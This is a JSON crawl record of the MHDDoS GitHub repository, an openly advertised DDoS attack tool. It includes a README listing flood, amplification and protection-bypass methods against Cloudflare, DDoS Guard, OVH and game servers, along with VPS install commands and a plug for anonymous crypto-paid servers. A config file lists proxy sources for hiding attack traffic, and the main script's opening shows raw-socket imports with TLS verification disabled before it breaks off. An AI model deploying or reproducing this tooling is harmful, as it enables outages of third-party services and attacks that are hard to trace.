{
  "metadata": {
    "timestamp": 1736561253164,
    "page": 245,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjI1MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "MatrixTM/MHDDoS",
      "stars": 13294,
      "defaultBranch": "main",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.0380859375,
          "content": "venv\n/.idea/\nfiles/proxies/*\n.DS_Store\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 0.1435546875,
          "content": "FROM python:3.8.12-buster\n\nWORKDIR /app\nCOPY ./ ./\nCOPY files files\n\nRUN pip3 install -r requirements.txt\n\nENTRYPOINT [\"python3\", \"/app/start.py\"]\n"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0400390625,
          "content": "MIT License\n\nCopyright (c) 2024 MatrixTM\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 11.0263671875,
          "content": "<p align=\"center\"><img src=\"https://i.ibb.co/3F6V9JQ/MHDDoS.png\" width=\"400px\" height=\"150px\" alt=\"ddos\"></p>\n\n<h1 align=\"center\">MHDDoS - DDoS Attack Script With 56 Methods</h1>\n<em><h5 align=\"center\">(Programming Language - Python 3)</h5></em>\n\n<p align=\"center\">\n<a href=\"#\"><img alt=\"MH-DDoS forks\" src=\"https://img.shields.io/github/forks/MatrixTM/MHDDoS?style=for-the-badge\"></a>\n<a href=\"#\"><img alt=\"MH-DDoS last commit (main)\" src=\"https://img.shields.io/github/last-commit/MatrixTM/MHDDoS/main?color=green&style=for-the-badge\"></a>\n<a href=\"#\"><img alt=\"MH-DDoS Repo stars\" src=\"https://img.shields.io/github/stars/MatrixTM/MHDDoS?style=for-the-badge&color=yellow\"></a>\n<a href=\"#\"><img alt=\"MH-DDoS License\" src=\"https://img.shields.io/github/license/MatrixTM/MHDDoS?color=orange&style=for-the-badge\"></a>\n<a href=\"https://github.com/MatrixTM/MHDDoS/issues\"><img alt=\"MatrixTM issues\" src=\"https://img.shields.io/github/issues/MatrixTM/MHDDoS?color=purple&style=for-the-badge\"></a>\n  \n<p align=\"center\">Please Don't Attack websites without the owners consent.</p>\n\n<p align=\"center\"><img src=\"https://i.imgur.com/aNrHJcA.png\" width=\"1078\" height=\"433\" alt=\"POWER\"></p>\n<p align=\"center\"><img src=\"https://i.imgur.com/4Q7v2wn.png\" width=\"1078\" height=\"296\" alt=\"SCRIPT\"></p>\n\n## Features And Methods\n\n * 💣 Layer7\n\n   * <img src=\"https://img.icons8.com/cotton/344/domain.png\" width=\"16\" height=\"16\" alt=\"get\"> GET | GET Flood\n   * <img src=\"https://cdn0.iconfinder.com/data/icons/database-storage-5/60/server__database__fire__burn__safety-512.png\" width=\"16\" height=\"16\" alt=\"post\"> POST | POST Flood\n   * <img src=\"https://static-00.iconduck.com/assets.00/ovh-icon-2048x2048-l4c3izvg.png\" width=\"16\" height=\"16\" alt=\"ovh\"> OVH | Bypass OVH\n   * <img src=\"https://cdn-icons-png.flaticon.com/512/1691/1691948.png\" width=\"16\" height=\"16\" alt=\"ovh\"> RHEX | Random HEX\n   * <img src=\"https://cdn-icons-png.flaticon.com/512/4337/4337972.png\" width=\"16\" height=\"16\" alt=\"ovh\"> STOMP | Bypass chk_captcha\n   * <img src=\"https://cdn.iconscout.com/icon/premium/png-256-thumb/cyber-bullying-2557797-2152371.png\" width=\"16\" height=\"16\" alt=\"stress\"> STRESS | Send HTTP Packet With High Byte \n   * <img src=\"https://pbs.twimg.com/profile_images/1351562987224641544/IKb4q_yd_400x400.jpg\" width=\"16\" height=\"16\" alt=\"dyn\"> DYN | A New Method With Random SubDomain\n   * <img src=\"https://cdn-icons-png.flaticon.com/512/6991/6991643.png\" width=\"16\" height=\"16\" alt=\"downloader\"> DOWNLOADER | A New Method of Reading data slowly\n   * <img src=\"https://cdn2.iconfinder.com/data/icons/poison-and-venom-fill/160/loris2-512.png\" width=\"16\" height=\"16\" alt=\"slow\"> SLOW | Slowloris Old Method of DDoS\n   * <img src=\"https://lyrahosting.com/wp-content/uploads/2020/06/ddos-how-work-icon.png\" width=\"16\" height=\"16\" alt=\"head\"> HEAD | https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods/HEAD\n   * <img src=\"https://img.icons8.com/plasticine/2x/null-symbol.png\" width=\"16\" height=\"16\" alt=\"null\"> NULL | Null UserAgent and ...\n   * <img src=\"https://i.pinimg.com/originals/03/2e/7d/032e7d0755cd511c753bcb6035d44f68.png\" width=\"16\" height=\"16\" alt=\"cookie\"> COOKIE | Random Cookie PHP 'if (isset($_COOKIE))'\n   * <img src=\"https://cdn0.iconfinder.com/data/icons/dicticons-files-folders/32/office_pps-512.png\" width=\"16\" height=\"16\" alt=\"pps\"> PPS |  Only 'GET / HTTP/1.1\\r\\n\\r\\n'\n   * <img src=\"https://cdn3.iconfinder.com/data/icons/internet-security-14/48/DDoS_website_webpage_bomb_virus_protection-512.png\" width=\"16\" height=\"16\" alt=\"even\"> EVEN | GET Method with more header\n   * <img src=\"https://iili.io/HU9BC74.png\" width=\"16\" height=\"16\" alt=\"googleshield\"> GSB | Google Project Shield Bypass\n   * <img src=\"https://seeklogo.com/images/D/ddos-guard-logo-CFEFCA409C-seeklogo.com.png\" width=\"16\" height=\"16\" alt=\"DDoSGuard\"> DGB | DDoS Guard Bypass\n   * <img src=\"https://i.imgur.com/bGL8qfw.png\" width=\"16\" height=\"16\" alt=\"ArvanCloud\"> AVB | Arvan Cloud Bypass\n   * <img src=\"https://iili.io/HU9BC74.png\" width=\"16\" height=\"16\" alt=\"Google bot\"> BOT | Like Google bot\n   * <img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/a/a8/Apache_HTTP_Server_Logo_%282016%29.svg/1000px-Apache_HTTP_Server_Logo_%282016%29.svg.png\" width=\"16\" height=\"16\" alt=\"Apache Webserver\"> APACHE | Apache Expliot\n   * <img src=\"https://icon-library.com/images/icon-for-wordpress/icon-for-wordpress-16.jpg\" width=\"16\" height=\"16\" alt=\"wordpress expliot\"> XMLRPC | WP XMLRPC exploit (add /xmlrpc.php)\n   * <img src=\"https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730\" width=\"16\" height=\"16\" alt=\"CloudFlare\"> CFB | CloudFlare Bypass\n   * <img src=\"https://techcrunch.com/wp-content/uploads/2019/06/J2LlHqT3qJl0bG9Alpgc-1-730x438.png?w=730\" width=\"16\" height=\"16\" alt=\"CloudFlare UnderAttack Mode\"> CFBUAM | CloudFlare Under Attack Mode Bypass\n   * <img src=\"http://iclouddnsbypass.com/wp-content/uploads/2015/02/iCloudDNSBypassServer.ico\" width=\"16\" height=\"16\" alt=\"bypass\"> BYPASS |  Bypass Normal AntiDDoS\n   * <img src=\"https://cdn-icons-png.flaticon.com/512/905/905568.png\" width=\"16\" height=\"16\" alt=\"bypass\"> BOMB |  Bypass with codesenberg/bombardier\n   * 🔪 KILLER | Run many threads to kill a target\n   * 🧅 TOR | Bypass onion website\n\n\n* 🧨 Layer4: \n  * <img src=\"https://raw.githubusercontent.com/kgretzky/pwndrop/master/media/pwndrop-logo-512.png\" width=\"16\" height=\"16\" alt=\"tcp\"> TCP | TCP Flood Bypass\n  * <img src=\"https://styles.redditmedia.com/t5_2rxmiq/styles/profileIcon_snoob94cdb09-c26c-4c24-bd0c-66238623cc22-headshot.png\" width=\"16\" height=\"16\" alt=\"udp\"> UDP | UDP Flood Bypass\n  * <img src=\"https://cdn-icons-png.flaticon.com/512/1918/1918576.png\" width=\"16\" height=\"16\" alt=\"syn\"> SYN | SYN Flood\n  * <img src=\"https://cdn-icons-png.flaticon.com/512/1017/1017466.png\" width=\"16\" height=\"16\" alt=\"cps\"> CPS | Open and close connections with proxy\n  * <img src=\"https://icon-library.com/images/icon-ping/icon-ping-28.jpg\" width=\"16\" height=\"16\" alt=\"icmp\"> ICMP | Icmp echo request flood (Layer3)\n  * <img src=\"https://s6.uupload.ir/files/1059643_g8hp.png\" width=\"16\" height=\"16\" alt=\"connection\"> CONNECTION | Open connection alive with proxy\n  * <img src=\"https://ia803109.us.archive.org/27/items/source-engine-video-projects/source-engine-video-projects_itemimage.png\" width=\"16\" height=\"16\" alt=\"vse\"> VSE | Send Valve Source Engine Protocol\n  * <img src=\"https://mycrackfree.com/wp-content/uploads/2018/08/TeamSpeak-Server-9.png\" width=\"16\" height=\"16\" alt=\"teamspeak 3\"> TS3 | Send Teamspeak 3 Status Ping Protocol\n  * <img src=\"https://cdn2.downdetector.com/static/uploads/logo/75ef9fcabc1abea8fce0ebd0236a4132710fcb2e.png\" width=\"16\" height=\"16\" alt=\"fivem\"> FIVEM | Send FiveM Status Ping Protocol\n  * <img src=\"https://cdn.iconscout.com/icon/free/png-512/redis-4-1175103.png\" width=\"16\" height=\"16\" alt=\"mem\"> MEM | Memcached Amplification\n  * <img src=\"https://lyrahosting.com/wp-content/uploads/2020/06/ddos-attack-icon.png\" width=\"16\" height=\"16\" alt=\"ntp\"> NTP | NTP Amplification\n  * <img src=\"https://cdn-icons-png.flaticon.com/512/4712/4712139.png\" width=\"16\" height=\"16\" alt=\"mcbot\"> MCBOT | Minecraft Bot Attack\n  * <img src=\"https://cdn.icon-icons.com/icons2/2699/PNG/512/minecraft_logo_icon_168974.png\" width=\"16\" height=\"16\" alt=\"minecraft\"> MINECRAFT | Minecraft Status Ping Protocol\n  * <img src=\"https://cdn.icon-icons.com/icons2/2699/PNG/512/minecraft_logo_icon_168974.png\" width=\"16\" height=\"16\" alt=\"minecraft pe\"> MCPE | Minecraft PE Status Ping Protocol\n  * <img src=\"https://cdn-icons-png.flaticon.com/512/2653/2653461.png\" width=\"16\" height=\"16\" alt=\"dns\"> DNS | DNS Amplification\n  * <img src=\"https://lyrahosting.com/wp-content/uploads/2020/06/ddos-attack-icon.png\" width=\"16\" height=\"16\" alt=\"chargen\"> CHAR | Chargen Amplification\n  * <img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRct5OvjSCpUftyRMm3evgdPOa-f8LbwJFO-A&usqp=CAU\" width=\"16\" height=\"16\" alt=\"cldap\"> CLDAP | Cldap Amplification\n  * <img src=\"https://help.apple.com/assets/6171BD2C588E52621824409D/6171BD2D588E5262182440A4/en_US/8b631353e070420f47530bf95f1a7fae.png\" width=\"16\" height=\"16\" alt=\"ard\"> ARD | Apple Remote Desktop Amplification\n  * <img src=\"https://www.tenforums.com/geek/gars/images/2/types/thumb__emote__esktop__onnection.png\" width=\"16\" height=\"16\" alt=\"rdp\"> RDP |  Remote Desktop Protocol Amplification\n\n* ⚙️ Tools - Runs With \n`\npython3 start.py tools\n`\n  * 🌟 CFIP | Find Real IP Address Of Websites Powered By Cloudflare\n  * 🔪 DNS | Show DNS Records Of Sites\n  * 📍  TSSRV | TeamSpeak SRV Resolver\n  * ⚠  PING | PING Servers\n  * 📌 CHECK | Check If Websites Status\n  * 😎 DSTAT | That Shows Bytes Received, bytes Sent and their amount\n\n* 🎩 Other\n  * ❌ STOP | STOP All Attacks\n  * 🌠 TOOLS | Console Tools\n  * 👑 HELP | Show Usage Script\n\n  \n<h1 align=\"center\">\nOur social's💻\n  \n</h2> \n\n<h1 style=\"color:red;text-align: center;\" style=\"text-align: center;\" align=\"center\">Please do not use the \"Issues\" section to ask your questions!</h1>\n<div align=\"center\">\n   <img src=\"https://icon-library.com/images/github-icon-vector/github-icon-vector-27.jpg\" width=\"64\" height=\"64\"/>\n   <img src=\"https://brandlogos.net/wp-content/uploads/2021/11/discord-logo.png\"  width=\"64\" height=\"64\" alt=\"discord\" />\n   <img src=\"https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/2048px-Telegram_logo.svg.png\" width=\"64\" height=\"64\" alt=\"telegram\" />\n</div>\n\n * [Matrix community Telegram channel](https://t.me/Matrix_Development)\n * [Matrix team Telegram Group](https://t.me/MatrixTMChat)\n * [GitHub](https://github.com/MatrixTM)\n### If u Like the project, leave a star on the repository!\n\n## Downloads\n\nYou can download it from [GitHub Releases](https://github.com/MatrixTM/MHDDoS/releases)\n\n### Getting Started\n\n**Requirements**\n\n* [dnspython](https://github.com/rthalley/dnspython)\n* [cfscrape](https://github.com/Anorov/cloudflare-scrape)\n* [impacket](https://github.com/SecureAuthCorp/impacket)\n* [requests](https://github.com/psf/requests)\n* [Python3][python3]\n* [PyRoxy](https://github.com/MatrixTM/PyRoxy)\n* [icmplib](https://github.com/ValentinBELYN/icmplib)\n* [certifi](https://github.com/certifi/python-certifi)\n* [psutil](https://github.com/giampaolo/psutil)\n* [yarl](https://github.com/aio-libs/yarl)\n---\n\n## Documentation\n\nYou can read it from [GitHub Wiki](https://github.com/MatrixTM/MHDDoS/wiki)\n\n**Clone and Install Script**\n\n```shell script\ngit clone https://github.com/MatrixTM/MHDDoS.git\ncd MHDDoS\npip install -r requirements.txt\n```\n\n**One-Line Installing on Fresh VPS**\n\n```shell script\napt -y update && apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git && git clone https://github.com/MatrixTM/MHDDoS.git && cd MH* && pip3 install -r requirements.txt\n```\n\n[python3]: https://python.org 'Python3'\n[github issues]: https://github.com/MatrixTM/MHDDoS/issues 'enter'\n\n---\n\n## Need a Cheap Hourly Server? No Problem\n\n<a href=\"https://aeza.net/?ref=375036\"><img src=\"https://i.ibb.co/wgq9Ly8/aezabanner.png\" width=\"728\" height=\"90\" alt=\"aeza\"></a>\n\n#### You can buy an hourly 10Gbps server from [Aeza Hosting](https://aeza.net/?ref=375036) with crypto (100% anonymous).\n"
        },
        {
          "name": "config.json",
          "type": "blob",
          "size": 9.61328125,
          "content": "{\n  \"MCBOT\": \"MHDDoS_\",\n  \"MINECRAFT_DEFAULT_PROTOCOL\": 47,\n  \"proxy-providers\": [\n\n\t\t{\"type\":4, \"url\": \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://api.openproxylist.xyz/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://proxyspace.pro/socks4.txt\",  \"timeout\": 5},\n\t  \t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt\",  \"timeout\": 5},\n\t  \t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"http://worm.rip/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://www.proxy-list.download/api/v1/get?type=socks4\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://www.proxyscan.io/download?type=socks4\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://www.my-proxy.com/free-socks-4-proxy.html\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"http://www.socks24.org/feeds/posts/default\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://www.freeproxychecker.com/result/socks4_proxies.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt\",  \"timeout\": 5},\n\t\t{\"type\":4, \"url\": \"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt\",  \"timeout\": 5},\n\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://api.openproxylist.xyz/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5\", \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://proxyspace.pro/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://raw.githubusercontent.com/BlackSnowDot/proxylist-update-every-minute/main/socks.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"http://worm.rip/socks5.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"http://www.socks24.org/feeds/posts/default\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://www.freeproxychecker.com/result/socks5_proxies.txt\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://www.proxy-list.download/api/v1/get?type=socks5\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://www.proxyscan.io/download?type=socks5\",  \"timeout\": 5},\n\t\t{\"type\":5, \"url\": \"https://www.my-proxy.com/free-socks-5-proxy.html\",  \"timeout\": 5},\n\n\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://api.proxyscrape.com/?request=displayproxies&proxytype=http\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://api.openproxylist.xyz/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://alexa.lr2b.com/proxylist.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://multiproxy.org/txt_all/proxy.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://proxyspace.pro/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://proxyspace.pro/https.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://proxy-spider.com/api/proxies.example.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://proxysearcher.sourceforge.net/Proxy%20List.php?type=http\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/all.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/BlackSnowDot/proxylist-update-every-minute/main/https.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/BlackSnowDot/proxylist-update-every-minute/main/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://rootjazz.com/proxies/proxies.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://spys.me/proxy.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://sheesh.rip/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://worm.rip/http.txt\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"http://www.proxyserverlist24.top/feeds/posts/default\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.proxy-list.download/api/v1/get?type=http\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.proxyscan.io/download?type=http\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-anonymous-proxy.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-transparent-proxy.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-2.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-3.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-4.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-5.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-6.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-7.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-8.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-9.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.my-proxy.com/free-proxy-list-10.html\",  \"timeout\": 5},\n\t\t{\"type\":1, \"url\": \"https://www.freeproxychecker.com/result/http_proxies.txt\",  \"timeout\": 5}\n\t\t\n\t]\n}\n"
        },
        {
          "name": "files",
          "type": "tree",
          "content": null
        },
        {
          "name": "requirements.txt",
          "type": "blob",
          "size": 0.1943359375,
          "content": "cloudscraper==1.2.71\ncertifi==2022.12.7\ndnspython==2.2.1\nrequests==2.27.1\nimpacket==0.10.0\npsutil>=5.9.3\nicmplib>=2.1.1\npyasn1==0.4.8\npyroxy @ git+https://github.com/MatrixTM/PyRoxy.git\nyarl>=1.7.2 \n"
        },
        {
          "name": "start.py",
          "type": "blob",
          "size": 70.318359375,
          "content": "#!/usr/bin/env python3\n \nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom contextlib import suppress\nfrom itertools import cycle\nfrom json import load\nfrom logging import basicConfig, getLogger, shutdown\nfrom math import log2, trunc\nfrom multiprocessing import RawValue\nfrom os import urandom as randbytes\nfrom pathlib import Path\nfrom re import compile\nfrom random import choice as randchoice\nfrom socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,\n                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,\n                    gethostname, socket)\nfrom ssl import CERT_NONE, SSLContext, create_default_context\nfrom struct import pack as data_pack\nfrom subprocess import run, PIPE\nfrom sys import argv\nfrom sys import exit as _exit\nfrom threading import Event, Thread\nfrom time import sleep, time\nfrom typing import Any, List, Set, Tuple\nfrom urllib import parse\nfrom uuid import UUID, uuid4\n\nfrom PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles\nfrom PyRoxy import Tools as ProxyTools\nfrom certifi import where\nfrom cloudscraper import create_scraper\nfrom dns import resolver\nfrom icmplib import ping\nfrom impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP\nfrom psutil import cpu_percent, net_io_counters, process_iter, virtual_memory\nfrom requests import Response, Session, exceptions, get, cookies\nfrom yarl import URL\nfrom base64 import b64encode\n\nbasicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',\n            datefmt=\"%H:%M:%S\")\nlogger = getLogger(\"MHDDoS\")\nlogger.setLevel(\"INFO\")\nctx: SSLContext = create_default_context(cafile=where())\nctx.check_hostname = False\nctx.verify_mode = CERT_NONE\n\n__version__: str = \"2.4 SNAPSHOT\"\n__dir__: Path = Path(__file__).parent\n__ip__: Any = None\ntor2webs = [\n            'onion.city',\n            'onion.cab',\n            'onion.direct',\n            'onion.sh',\n            'onion.link',\n            'onion.ws',\n            'onion.pet',\n            'onion.rip',\n            'onion.plus',\n            'onion.top',\n            'onion.si',\n            'onion.ly',\n            'onion.my',\n            'onion.sh',\n            